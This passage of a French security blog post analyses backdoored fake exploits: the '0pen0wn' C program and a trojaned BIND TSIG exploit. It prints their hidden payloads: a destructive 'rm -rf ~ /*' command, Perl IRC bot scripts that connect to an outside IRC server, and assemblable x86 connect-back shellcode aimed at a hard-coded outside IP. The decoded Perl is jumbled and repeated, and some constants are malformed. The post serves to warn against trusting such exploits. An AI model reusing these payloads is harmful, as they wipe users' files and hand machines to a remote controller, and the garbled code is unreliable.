<span class="s">"</span><span class="se">\x6b\x65\x79\x5c\x6e\x22\x3b\x77\x68\x69\x6c\x65\x20\x28\x3c\x24</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x73\x6f\x63\x6b\x3e\x29\x7b\x69\x66\x20\x28\x2f\x5e\x50\x49\x4e</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x47\x20\x28\x2e\x2a\x29\x24\x2f\x29\x7b\x70\x72\x69\x6e\x74\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x24\x63\x68\x61\x6e\x3d\x22\x23\x63\x6e\x22\x3b\x24\x6b\x65\x79</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x20\x3d\x22\x66\x61\x67\x73\x22\x3b\x24\x6e\x69\x63\x6b\x3d\x22</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x7d\x7d\x23\x63\x68\x6d\x6f\x64\x20\x2b\x78\x20\x2f\x74\x6d\x70</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x2f\x68\x69\x20\x32\x3e\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x3b</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x2f\x74\x6d\x70\x2f\x68\x69\x0a</span><span class="s">"</span><span class="p">;</span>

<span class="cp">#define SIZE 0xffffff
#define OFFSET 131
#define fremote build_frem(t,e,s,m,y)
</span>
<span class="kt">void</span> <span class="n">usage</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">arg</span><span class="p">){</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] 0pen0wn 0wnz Linux/FreeBSD</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">" Usage: %s -h -p port</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">" Options:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">" </span><span class="se">\t</span><span class="s">-h ip/host of target</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">" </span><span class="se">\t</span><span class="s">-p port</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">" </span><span class="se">\t</span><span class="s">-d username</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">" </span><span class="se">\t</span><span class="s">-B memory_limit 8/16/64</span><span class="se">\n\n\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="cp">#define FD 0×080518fc
#define BD 0×08082000
</span>
<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span> 
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">jmpinst</span><span class="p">;</span> 
  <span class="kt">char</span> <span class="n">h</span><span class="p">[</span><span class="mi">500</span><span class="p">],</span><span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span><span class="n">fremote</span><span class="p">(</span><span class="n">jmpcode</span><span class="p">);</span><span class="kt">char</span> <span class="o">*</span><span class="n">payload</span><span class="p">,</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span> 
  <span class="kt">int</span> <span class="n">port</span><span class="o">=</span><span class="mi">23</span><span class="p">,</span> <span class="n">limit</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span> <span class="n">target</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">sock</span><span class="p">;</span> 
  <span class="k">struct</span> <span class="n">hostent</span> <span class="o">*</span><span class="n">host</span><span class="p">;</span> 
  <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">addr</span><span class="p">;</span> 
  <span class="k">if</span> <span class="p">(</span><span class="n">geteuid</span><span class="p">())</span> <span class="p">{</span> 
    <span class="n">puts</span><span class="p">(</span><span class="s">"need root for raw socket, etc..."</span><span class="p">);</span> 
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span> 
  <span class="p">}</span> 
  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span> 
    <span class="n">usage</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> 
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span> 
  <span class="p">}</span> 
  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">  [+] 0wn0wn - by anti-sec group</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span> 
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">inet_aton</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">))</span> <span class="p">{</span> 
    <span class="n">host</span> <span class="o">=</span> <span class="n">gethostbyname</span><span class="p">(</span><span class="n">h</span><span class="p">);</span> 
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">host</span><span class="p">)</span> <span class="p">{</span> 
      <span class="n">printf</span><span class="p">(</span><span class="s">"  [-] Resolving failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span> 
      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span> 
    <span class="p">}</span> 
    <span class="n">addr</span><span class="p">.</span><span class="n">sin_addr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="k">struct</span> <span class="n">in_addr</span><span class="o">*</span><span class="p">)</span><span class="n">host</span><span class="o">-&gt;</span><span class="n">h_addr</span><span class="p">;</span> 
  <span class="p">}</span> 
  <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">PF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> 
  <span class="n">addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">port</span><span class="p">);</span> 
  <span class="n">addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span> 
  <span class="k">if</span> <span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span> 
      <span class="n">printf</span><span class="p">(</span><span class="s">"  [-] Connecting failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span> 
      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span> 
  <span class="p">}</span> 
  <span class="n">payload</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">limit</span> <span class="o">*</span> <span class="mi">10000</span><span class="p">);</span> 
  <span class="n">ptr</span> <span class="o">=</span> <span class="n">payload</span><span class="o">+</span><span class="mi">8</span><span class="p">;</span> 
  <span class="n">memcpy</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="n">jmpcode</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">jmpcode</span><span class="p">));</span> 
  <span class="n">jmpinst</span><span class="o">=</span><span class="n">fopen</span><span class="p">(</span><span class="n">shellcode</span><span class="o">+</span><span class="mi">793</span><span class="p">,</span><span class="s">"w+"</span><span class="p">);</span> 
  <span class="k">if</span> <span class="p">(</span><span class="n">jmpinst</span><span class="p">)</span> <span class="p">{</span> 
    <span class="n">fseek</span><span class="p">(</span><span class="n">jmpinst</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">SEEK_SET</span><span class="p">);</span> 
    <span class="n">fprintf</span><span class="p">(</span><span class="n">jmpinst</span><span class="p">,</span><span class="s">"%s"</span><span class="p">,</span><span class="n">shellcode</span><span class="p">);</span> 
    <span class="n">fclose</span><span class="p">(</span><span class="n">jmpinst</span><span class="p">);</span> 
  <span class="p">}</span> 
  <span class="n">ptr</span> <span class="o">+=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">jmpcode</span><span class="p">);</span> 
  <span class="k">if</span> <span class="p">(</span><span class="n">target</span> <span class="o">!=</span> <span class="mi">5</span> <span class="o">&amp;&amp;</span> <span class="n">target</span> <span class="o">!=</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span> 
    <span class="n">memcpy</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="n">shellcode</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span> 
    <span class="n">ptr</span> <span class="o">+=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span> 
    <span class="n">memset</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="sc">'B'</span><span class="p">,</span><span class="n">limit</span> <span class="o">*</span> <span class="mi">10000</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">-</span> <span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span> 
  <span class="p">}</span> <span class="k">else</span><span class="p">{</span> 
    <span class="n">memcpy</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="n">fbsd_shellcode</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">fbsd_shellcode</span><span class="p">));</span> 
    <span class="n">ptr</span> <span class="o">+=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">fbsd_shellcode</span><span class="p">);</span> 
    <span class="n">memset</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="sc">'B'</span><span class="p">,</span><span class="n">limit</span> <span class="o">*</span> <span class="mi">10000</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">-</span> <span class="n">strlen</span><span class="p">(</span><span class="n">fbsd_shellcode</span><span class="p">));</span> 
  <span class="p">}</span> 
  <span class="n">send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="n">buffer</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span><span class="mi">0</span><span class="p">);</span> 
  <span class="n">send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="n">ptr</span><span class="p">,</span><span class="mi">3750</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> 
  <span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span> 
  <span class="k">if</span> <span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>  <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> 
    <span class="n">printf</span><span class="p">(</span><span class="s">"  [-] connecting failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span> 
  <span class="p">}</span> 
  <span class="n">payload</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span> 
  <span class="n">payload</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span> 
  <span class="n">send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="n">buffer</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span><span class="mi">0</span><span class="p">);</span> 
  <span class="n">send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="n">payload</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span><span class="mi">0</span><span class="p">);</span> 
  <span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span> 
  <span class="n">free</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span> 
  <span class="n">addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">6666</span><span class="p">);</span> 
  <span class="k">if</span> <span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>  <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> 
    <span class="cm">/* v--- our cool bar that says: "r0000000t!!!" */</span> 
    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">  [~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&gt;]</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span> 
    <span class="n">fremote</span><span class="p">(</span><span class="s">"PS1='sh-3.2#' /bin/sh"</span><span class="p">);</span> 
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"  [-] failed to exploit target :-(</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span> 
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> 
<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Le sploit a l’air “légitime” au premier abord mais je n’avais jamais mais alors jamais vu un shellcode aussi énorme … de plus ça vient d’un groupe pronant l’anti-sec. De quoi ne pas faire confiance … :).</p>

<p>Le “jmpcode”:</p>

<figure class="highlight"><pre><code class="language-perl" data-lang="perl"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre><span class="nv">rm</span> <span class="o">-</span><span class="nv">rf</span> <span class="o">~</span> <span class="sr">/* 2&gt; /d</span><span class="nv">ev</span><span class="o">/</span><span class="nv">null</span> <span class="o">&amp;</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Le “shellcode”:</p>

<figure class="highlight"><pre><code class="language-perl" data-lang="perl"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre></td><td class="code"><pre><span class="c1">#!/usr/bin/perl</span>
<span class="nv">$chan</span><span class="o">=</span><span class="s">"#cn"</span><span class="p">;</span>
<span class="nv">$ke</span><span class="s">";
while (&lt;$sockG (.*)$/){print "</span><span class="p">;</span>
<span class="k">while</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">$sockn</span><span class="s">";
            sleep 1;
       k\n"</span><span class="p">;}}</span><span class="k">print</span> <span class="nv">$sock</span> <span class="s">"JOIN $chan $key\n"</span><span class="p">;</span><span class="k">while</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">$sock</span><span class="o">&gt;</span><span class="p">){</span><span class="k">if</span> <span class="p">(</span><span class="sr">/^PING (.*)$/</span><span class="p">){</span><span class="k">print</span> <span class="c1">#!/usr/bin/perl</span>
<span class="c1">#!/usr/bin/perl</span>
<span class="nv">n</span><span class="s">";
            #!/usr/bin/perl
$chan="</span><span class="c1">#cn";$key ="fags";$nick="phpfr";$server="G (.*)$/){print ";</span>
<span class="k">while</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">$sockn</span><span class="s">";
            sleep 1;
       k\n"</span><span class="p">;}}</span><span class="k">print</span> <span class="nv">$sock</span> <span class="s">"JOIN $chan $key\n"</span><span class="p">;</span><span class="k">while</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">$sock</span><span class="o">&gt;</span><span class="p">){</span><span class="k">if</span> <span class="p">(</span><span class="sr">/^PING (.*)$/</span><span class="p">){</span><span class="k">print</span> <span class="c1">#!/usr/bin/perl</span>
<span class="c1">#!/usr/bin/perl</span>
<span class="nv">irc</span><span class="o">.</span><span class="nv">ham</span><span class="o">.</span><span class="nv">de</span><span class="o">.</span><span class="nv">euirc</span><span class="o">.</span><span class="nv">net</span><span class="s">";$SIG{TERM}"</span><span class="p">;</span>
<span class="k">while</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">$sock</span><span class="s">";
while (&lt;$sockn"</span><span class="p">;</span>
            <span class="nb">sleep</span> <span class="mi">1</span><span class="p">;</span>
       <span class="nv">n</span><span class="s">";
            #!/usr/bin/perl
$chan="</span><span class="c1">#cn";$key ="fags";$nick="k\n";}}print $sock "JOIN $chan $key\n";while (&lt;$sock&gt;){if (/^PING (.*)$/){print phpfr";$server="irc.ham.de.euirc.net";$SIG{TERM}sleep 1;</span>
       <span class="nb">sleep</span> <span class="mi">1</span><span class="p">;</span>
       <span class="s">";
while (&lt;$sockn"</span><span class="p">;</span>
            <span class="nb">sleep</span> <span class="mi">1</span><span class="p">;</span>
       <span class="c1">#!/usr/bin/perl</span>
<span class="nv">$chan</span><span class="o">=</span><span class="s">"#cn"</span><span class="p">;</span><span class="nv">$key</span> <span class="o">=</span><span class="s">"fags"</span><span class="p">;</span><span class="nv">$nick</span><span class="o">=</span><span class="s">"phpfr"</span><span class="p">;</span><span class="nv">$server</span><span class="o">=</span><span class="s">"irc.ham.de.euirc.net"</span><span class="p">;</span><span class="nv">$SIG</span><span class="p">{</span><span class="nv">TERM</span><span class="p">}</span><span class="nv">d</span> <span class="o">+</span><span class="nv">x</span> <span class="sr">/tmp/</span><span class="nv">hi</span> <span class="mi">2</span><span class="o">&gt;</span><span class="sr">/dev/null</span><span class="p">;</span><span class="sr">/tmp/</span><span class="nv">hi</span><span class="s">";
while (&lt;$sockn"</span><span class="p">;</span>
            <span class="nb">sleep</span> <span class="mi">1</span><span class="p">;</span>
       <span class="nv">k</span><span class="o">\</span><span class="nv">n</span><span class="s">";}}print $sock "</span><span class="nv">JOIN</span> <span class="nv">$chan</span> <span class="nv">$key</span><span class="o">\</span><span class="nv">n</span><span class="s">";while (&lt;$sock&gt;){if (/^PING (.*)$/){print "</span><span class="p">;</span>
<span class="k">while</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">$sockn</span><span class="s">";
            sleep 1;
       k\n"</span><span class="p">;}}</span><span class="k">print</span> <span class="nv">$sock</span> <span class="s">"JOIN $chan $key\n"</span><span class="p">;</span><span class="k">while</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">$sock</span><span class="o">&gt;</span><span class="p">){</span><span class="k">if</span> <span class="p">(</span><span class="sr">/^PING (.*)$/</span><span class="p">){</span><span class="k">print</span> <span class="c1">#!/usr/bin/perl</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Et le “shellcode FreeBSD”:</p>

<figure class="highlight"><pre><code class="language-perl" data-lang="perl"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="code"><pre><span class="s">";
while (&lt;$sockn"</span><span class="p">;</span>
             <span class="o">=</span><span class="s">"fags"</span><span class="p">;</span><span class="nv">$nick</span><span class="o">=</span><span class="s">"phpfr"</span><span class="p">;</span><span class="nv">$server</span><span class="o">=</span><span class="s">"irc.ham.de.euirc.net"</span><span class="p">;</span><span class="nv">$SIG</span><span class="p">{</span><span class="nv">TERM</span><span class="p">}</span><span class="s">";
while (&lt;$sock"</span><span class="p">;</span>
<span class="k">while</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">$sockn</span><span class="s">";
            sleep 1;
       n"</span><span class="p">;</span>
            <span class="c1">#!/usr/bin/perl</span>
<span class="nv">$chan</span><span class="o">=</span><span class="s">"#cn"</span><span class="p">;</span><span class="nv">$key</span> <span class="o">=</span><span class="s">"fags"</span><span class="p">;</span><span class="nv">$nick</span><span class="o">=</span><span class="s">"sleep 1;
       #!/usr/bin/perl
$chan="</span><span class="c1">#cn";$key ="fags";$nick="phpfr";$server="irc.ham.de.euirc.net";$SIG{TERM}d +x /tmp/hi 2&gt;/dev/null;/tmp/hi";</span>
<span class="k">while</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">$sockn</span><span class="s">";
            sleep 1;
       k\n"</span><span class="p">;}}</span><span class="k">print</span> <span class="nv">$sock</span> <span class="s">"JOIN $chan $key\n"</span><span class="p">;</span><span class="k">while</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">$sock</span><span class="o">&gt;</span><span class="p">){</span><span class="k">if</span> <span class="p">(</span><span class="sr">/^PING (.*)$/</span><span class="p">){</span><span class="k">print</span> <span class="s">";
while (&lt;$sockn"</span><span class="p">;</span>
            <span class="nb">sleep</span> <span class="mi">1</span><span class="p">;</span>
       <span class="nv">k</span><span class="o">\</span><span class="nv">n</span><span class="s">";}}print $sock "</span><span class="nv">JOIN</span> <span class="nv">$chan</span> <span class="nv">$key</span><span class="o">\</span><span class="nv">n</span><span class="s">";while (&lt;$sock&gt;){if (/^PING (.*)$/){print #!/usr/bin/perl
#!/usr/bin/perl
$chan="</span><span class="c1">#cn";$key ="fags";$nick="}}#chmod +x /tmp/hi 2&gt;/dev/null;/tmp/hi</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Eh oui, 2 beaux scripts Perl qui vont vous connecter à une chan IRC …
Par contre, je ne vois pas du tout comment ils le lancent leur script PERL, pas d’execve(), pas de system() … si quelqu’un peut répondre à cette question ça serait cool :).</p>

<p>Et on va finir par le plus “stealth” :).</p>

<h1 id="bind-tsig-buffer-overflow">BIND TSIG buffer overflow</h1>

<p>Il y a quelques années de ça déjà (2001!!), un remote BOF sur BIND (donc assez critique) apparait sur les mailings lists: <a href="http://packetstormsecurity.org/0102-exploits/tsl_bind.c">BIND TSIG buffer overflow</a> .</p>

<p>Le pire dans l’histoire c’est que c’est un vrai sploit :). L’analyse par l’équipe Metasploit: <a href="http://blog.metasploit.com/2010/04/penetration-testing-learn-assembly.html">Penetration Testing: Learn Assembly?</a>, montre tout de même que le bouzin est backdooré.</p>

<p>Déjà là où on peut tilter c’est la taille de la payload … 190 bytes! Enorme pour une payload connectback Linux. De mes souvenirs ça tiens plutôt entre 90-128 bytes mais pas 190 …</p>

<p>Le code ASM analysé (et parfaitement assemblable avec NASM ;)):</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
</pre></td><td class="code"><pre><span class="n">bits</span> <span class="mi">32</span>

<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
    <span class="kr">global</span> <span class="n">_start</span>

<span class="n">_start</span><span class="o">:</span>
    <span class="k">cmp</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x90</span>
    <span class="k">mov</span> <span class="n">esi</span><span class="p">,</span> <span class="n">esp</span>
    <span class="k">add</span> <span class="n">esi</span><span class="p">,</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x40</span>
    <span class="k">mov</span> <span class="n">dword</span> <span class="p">[esi],</span> <span class="mh">0xac0b0002</span>         <span class="c">; 0x2 =&gt; AF_INET and 0x0bac = 2988 = port</span>
    <span class="k">mov</span> <span class="n">dword</span> <span class="err">[</span><span class="n">esi</span><span class="o">+</span><span class="mh">0x4</span><span class="err">]</span><span class="p">,</span> <span class="mh">0xa047c497</span>     <span class="c">; ip = 151.196.71.160</span>

<span class="p">.</span><span class="n">connection</span><span class="o">:</span>
    <span class="c">; socket(PF_INET, SOCK_STREAM, 0);</span>
    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
    <span class="c">; sin_zero</span>
    <span class="k">mov</span> <span class="err">[</span><span class="n">esi</span><span class="o">+</span><span class="mh">0x8</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>
    <span class="k">mov</span> <span class="err">[</span><span class="n">esi</span><span class="o">+</span><span class="mh">0xc</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>
    <span class="c">; construct socketcall args[]</span>
    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
    <span class="k">mov</span> <span class="err">[</span><span class="n">esi</span><span class="o">+</span><span class="mh">0x28</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>     <span class="c">; IPPROTO_IP</span>
    <span class="k">inc</span> <span class="n">eax</span>
    <span class="k">mov</span> <span class="err">[</span><span class="n">esi</span><span class="o">+</span><span class="mh">0x24</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>     <span class="c">; SOCK_STREAM</span>
    <span class="k">inc</span> <span class="n">eax</span>
    <span class="k">mov</span> <span class="err">[</span><span class="n">esi</span><span class="o">+</span><span class="mh">0x20</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>     <span class="c">; PF_INET</span>
    <span class="k">lea</span> <span class="n">ecx</span><span class="p">,</span> <span class="err">[</span><span class="n">esi</span><span class="o">+</span><span class="mh">0x20</span><span class="err">]</span>     <span class="c">; socketcall args</span>
    <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>
    <span class="k">inc</span> <span class="n">ebx</span>                 <span class="c">; socket()</span>
    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
    <span class="k">add</span> <span class="n">eax</span><span class="p">,</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x66</span>     <span class="c">; socketcall()</span>
    <span class="k">push</span> <span class="n">ecx</span>                <span class="c">; socket call args</span>
    <span class="k">push</span> <span class="n">ebx</span>                <span class="c">; SYS_SOCKET</span>
    <span class="k">push</span> <span class="n">eax</span>                <span class="c">; __NR_SOCKETCALL</span>
    <span class="k">int</span> <span class="mh">0x80</span>

    <span class="c">; connect(sockfd, {sa_family=AF_INET, sin_port=htons(2988), sin_addr=inet_addr("151.196.71.160")}, 16);</span>
    <span class="k">mov</span> <span class="err">[</span><span class="n">esi</span><span class="o">+</span><span class="mh">0x20</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>     <span class="c">; sockfd</span>
    <span class="k">nop</span>
    <span class="k">cmp</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x90</span>
    <span class="k">lea</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[esi]</span>
    <span class="k">mov</span> <span class="err">[</span><span class="n">esi</span><span class="o">+</span><span class="mh">0x24</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>     <span class="c">; const struct sockaddr *serv_addr</span>
    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
    <span class="k">add</span> <span class="n">eax</span><span class="p">,</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x10</span>
    <span class="k">mov</span> <span class="err">[</span><span class="n">esi</span><span class="o">+</span><span class="mh">0x28</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>     <span class="c">; addrlen</span>
    <span class="k">pop</span> <span class="n">eax</span>                 <span class="c">; __NR_SOCKETCALL</span>
    <span class="k">pop</span> <span class="n">ebx</span>                 
    <span class="k">pop</span> <span class="n">ecx</span>                 <span class="c">; sockcall args</span>
    <span class="k">inc</span> <span class="n">ebx</span>                 
    <span class="k">inc</span> <span class="n">ebx</span>                 <span class="c">; ebx = SYS_CONNECT</span>
    <span class="k">push</span> <span class="n">dword</span> <span class="err">[</span><span class="n">esi</span><span class="o">+</span><span class="mh">0x20</span><span class="err">]</span>   <span class="c">; sockfd</span>
    <span class="k">int</span> <span class="mh">0x80</span>

    <span class="k">pop</span> <span class="n">ebx</span>                 <span class="c">; ebx = sockfd</span>
    <span class="k">dec</span> <span class="n">edi</span>                 <span class="c">; assume edi = 0 for connection to 151.196.71.160 then "our" connection</span>
    <span class="k">jz</span> <span class="p">.</span><span class="n">launchshell</span>

    <span class="c">; send sockaddr struct</span>
    <span class="c">; write(sockfd, buf, 12);</span>
    <span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[esp]</span>
    <span class="k">mov</span> <span class="err">[</span><span class="n">esi</span><span class="o">+</span><span class="mh">0x8</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>
    <span class="k">nop</span>
    <span class="k">mov</span> <span class="n">ebp</span><span class="p">,</span> <span class="mh">0x100007f</span>              <span class="c">; ip = 127.0.0.1</span>
